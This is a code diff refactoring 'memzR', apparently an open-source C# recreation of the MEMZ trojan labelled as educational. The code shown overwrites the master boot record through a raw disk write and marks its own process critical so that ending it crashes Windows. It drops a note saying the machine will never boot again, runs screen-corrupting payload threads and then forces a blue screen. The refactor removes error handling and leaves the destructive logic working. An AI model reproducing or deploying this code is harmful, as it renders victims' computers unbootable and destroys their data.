@@ -426,19 +426,7 @@ namespace memzR
         [DllImport("user32.dll")]
         private static extern IntPtr GetWindowDC(IntPtr hWnd);
         [DllImport("gdi32.dll")]
-        private static extern bool StretchBlt(
-        IntPtr hdcDest,
-        int nXOriginDest,
-        int nYOriginDest,
-        int nWidthDest,
-        int nHeightDest,
-        IntPtr hdcSrc,
-        int nXOriginSrc,
-        int nYOriginSrc,
-        int nWidthSrc,
-        int nHeightSrc,
-        uint dwRop
-    );
+        private static extern bool StretchBlt(IntPtr hdcDest,int nXOriginDest,int nYOriginDest,int nWidthDest,int nHeightDest,IntPtr hdcSrc,int nXOriginSrc,int nYOriginSrc,int nWidthSrc,int nHeightSrc,uint dwRop);
         public struct POINT
         {
             public int X;
@@ -450,33 +438,47 @@ namespace memzR
 
         static void Main(string[] args)
         {
-            if (MessageBox.Show("You're about to run memzR by CiberBoy, a recreation of MEMZ by Leurak\nfor educational purposes, to be open source to show how this malware works.\nThis malware may damage your system and render it unbootable.\nAre you sure you wanna continue, resulting in an unbootable machine?", "memzR - Warning!", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.Yes)
+            if (MessageBox.Show("You're about to run memzR by CiberBoy, a recreation of MEMZ by Leurak\nfor educational purposes, to be open source to show how this malware works.\nThis malware may damage your system and render it unbootable.\nAre you sure you wanna continue, resulting in an unbootable machine?", "memzR - Warning!", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.No)
             {
-                if (MessageBox.Show("This is the last warning!!!!\nI won't make responsible for any damages!!\nStill execute memzR?", "memzR - Last Warning!!!", MessageBoxButtons.YesNo, MessageBoxIcon.Warning)==DialogResult.Yes)
-                {
-                    go_payload();
-                }
+                Environment.Exit(1);
             }
+            if (MessageBox.Show("This is the last warning!!!!\nI won't make responsible for any damages!!\nStill execute memzR?", "memzR - Last Warning!!!", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.No)
+            {
+                Environment.Exit(1);
+            }
+            go_payload();
+        }
+        static void notepad()
+        {
+            string path = @"C:\note.txt";
+            File.WriteAllText(path,
+            "YOUR COMPUTER HAS BEEN FUCKED BY THE MEMZR TROJAN!" + Environment.NewLine +
+            Environment.NewLine +
+            "Your computer won't boot up again," + Environment.NewLine +
+            "so use it as long as you can!" + Environment.NewLine +
+            Environment.NewLine +
+            ":D" + Environment.NewLine +
+            Environment.NewLine +
+            "Trying to kill memzR will cause your system to be" + Environment.NewLine +
+            "destroyed instantly, so don't try it :D");
+            Process.Start(path);
+        }
+        static void set_critical()
+        {
+            IntPtr handleproc = Process.GetCurrentProcess().Handle;
+            int critical = 1;
+            NtSetInformationProcess(handleproc, ProcessBreakOnTermination, ref critical, sizeof(int));
+        }
+        public static void Payload(Thread t, int delay)
+        {
+            t.Start();
+            Thread.Sleep(delay);
         }
         static void go_payload()
         {
             mbroverwriter();
-            Process currproc = Process.GetCurrentProcess();
-            IntPtr handleproc = currproc.Handle;
-            int critical = 1;
-            NtSetInformationProcess(handleproc, ProcessBreakOnTermination, ref critical, sizeof(int));
-            string path = @"C:\note.txt";
-            File.WriteAllText(path,
-     "YOUR COMPUTER HAS BEEN FUCKED BY THE MEMZR TROJAN!" + Environment.NewLine +
-     Environment.NewLine +
-     "Your computer won't boot up again," + Environment.NewLine +
-     "so use it as long as you can!" + Environment.NewLine +
-     Environment.NewLine + 
-     ":D" + Environment.NewLine +
-     Environment.NewLine + 
-     "Trying to kill memzR will cause your system to be" + Environment.NewLine +
-     "destroyed instantly, so don't try it :D");
-            Process.Start(path);
+            set_critical();
+            notepad();
             Thread.Sleep(20000);
             Thread gsearchT = new Thread(google_search);
             Thread invT = new Thread(colorINV);
@@ -485,21 +487,15 @@ namespace memzR
             Thread eT = new Thread(erricon);
             Thread lolT = new Thread(msgboxes);
             Thread tunnelT = new Thread(tunnel);
-            gsearchT.Start();
-            Thread.Sleep(20000);
-            sT.Start();
-            Thread.Sleep(20000);
-            mt.Start();
-            Thread.Sleep(15000);
-            eT.Start();
-            Thread.Sleep(15000);
+
+            Payload(gsearchT, 20000);
+            Payload(sT, 20000);
+            Payload(mt, 15000);
+            Payload(eT, 15000);
             gsearchT.Abort();
-            invT.Start();
-            Thread.Sleep(20000);
-            lolT.Start();
-            Thread.Sleep(20000);
-            tunnelT.Start();
-            Thread.Sleep(45000);
+            Payload(invT, 20000);
+            Payload(lolT, 20000);
+            Payload(tunnelT, 45000);
             throw_bsod();
         }
         static void tunnel()
@@ -508,8 +504,7 @@ namespace memzR
             {
                 int x = Screen.PrimaryScreen.Bounds.Width;
                 int y = Screen.PrimaryScreen.Bounds.Height;
-                IntPtr hwnd = GetDesktopWindow();
-                IntPtr hdc = GetWindowDC(hwnd);
+                IntPtr hdc = GetDC(IntPtr.Zero);
                 StretchBlt(hdc, 25, 25, x - 50, y - 50, hdc, 0, 0, x, y, SRCCOPY);
                 Thread.Sleep(200);
             }
@@ -581,32 +576,19 @@ namespace memzR
             {
                 POINT cursorPos;
                 if (!GetCursorPos(out cursorPos)) break;
-                IntPtr desktopHdc = GetDC(IntPtr.Zero);
-                if (desktopHdc == IntPtr.Zero) break;
-                DrawIcon(desktopHdc, cursorPos.X, cursorPos.Y, hicon);
-                ReleaseDC(IntPtr.Zero, desktopHdc);
+                IntPtr hdc = GetDC(IntPtr.Zero);
+                if (hdc == IntPtr.Zero) break;
+                DrawIcon(hdc, cursorPos.X, cursorPos.Y, hicon);
+                ReleaseDC(IntPtr.Zero, hdc);
                 Thread.Sleep(15);
             }
         }
         static void mbroverwriter()
         {
-            IntPtr diskHandle = CreateFile(devicePath, GENERIC_READ | GENERIC_WRITE, 0, IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);
-            if (diskHandle == IntPtr.Zero)
-            {
-                Console.WriteLine("error overwrite mbr: " + Marshal.GetLastWin32Error());
-                return;
-            }
+            IntPtr h = CreateFile(devicePath, GENERIC_READ | GENERIC_WRITE, 0, IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);
             uint bytesWritten = 0;
-            bool write = WriteFile(diskHandle, MBR, (uint)MBR.Length, ref bytesWritten, IntPtr.Zero);
-            if (!write)
-            {
-                Console.WriteLine("fatal error!!!! " + Marshal.GetLastWin32Error());
-            }
-            else
-            {
-                Console.WriteLine("mbr correctly overwritten");
-            }
-            CloseHandle(diskHandle);
+            bool write = WriteFile(h, MBR, (uint)MBR.Length, ref bytesWritten, IntPtr.Zero);
+            CloseHandle(h);
         }
         static void search(string path)
         {
@@ -636,16 +618,16 @@ namespace memzR
             int ts = 1000;
             while (true)
             {
-                IntPtr desktopHdc = GetDC(IntPtr.Zero);
-                IntPtr memHdc = CreateCompatibleDC(desktopHdc);
-                IntPtr hBitmap = CreateCompatibleBitmap(desktopHdc, sw, sh);
-                IntPtr hOld = SelectObject(memHdc, hBitmap);
-                BitBlt(memHdc, 0, 0, sw, sh, desktopHdc, 0, 0, SRCCOPY);
-                BitBlt(desktopHdc, 0, 0, sw, sh, memHdc, 0, 0, NOTSRCCOPY);
-                SelectObject(memHdc, hOld);
+                IntPtr hdc = GetDC(IntPtr.Zero);
+                IntPtr memdc = CreateCompatibleDC(hdc);
+                IntPtr hBitmap = CreateCompatibleBitmap(hdc, sw, sh);
+                IntPtr hOld = SelectObject(memdc, hBitmap);
+                BitBlt(memdc, 0, 0, sw, sh, hdc, 0, 0, SRCCOPY);
+                BitBlt(hdc, 0, 0, sw, sh, memdc, 0, 0, NOTSRCCOPY);
+                SelectObject(memdc, hOld);
                 DeleteObject(hBitmap);
-                DeleteDC(memHdc);
-                ReleaseDC(IntPtr.Zero, desktopHdc);
+                DeleteDC(memdc);
+                ReleaseDC(IntPtr.Zero, hdc);
                 if (ts > 80)
                 {
                     ts -= 20;
